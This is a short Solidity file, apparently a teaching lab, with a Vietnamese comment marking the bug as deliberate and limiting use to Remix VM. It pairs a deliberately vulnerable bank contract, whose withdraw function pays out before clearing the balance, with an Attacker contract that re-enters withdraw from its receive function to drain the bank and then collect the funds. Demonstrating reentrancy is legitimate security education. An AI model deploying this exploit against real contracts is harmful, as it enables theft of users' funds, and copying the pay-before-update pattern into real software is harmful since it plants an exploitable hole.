// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// CANH BAO: Hop dong nay co loi co y. Chi dung tren Remix VM.
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Khong co so du");
        (bool ok, ) = msg.sender.call{value: balance}("");
        require(ok, "Chuyen that bai");
        balances[msg.sender] = 0;
    }

    function bankBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attacker {
    VulnerableBank public bank;
    address public owner;

    constructor(address bankAddress) {
        bank = VulnerableBank(bankAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Can it nhat 1 ETH lam von");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) bank.withdraw();
    }

    function collect() external {
        require(msg.sender == owner, "Khong phai chu");
        (bool ok, ) = payable(owner).call{value: address(this).balance}("");
        require(ok, "Chuyen that bai");
    }
}

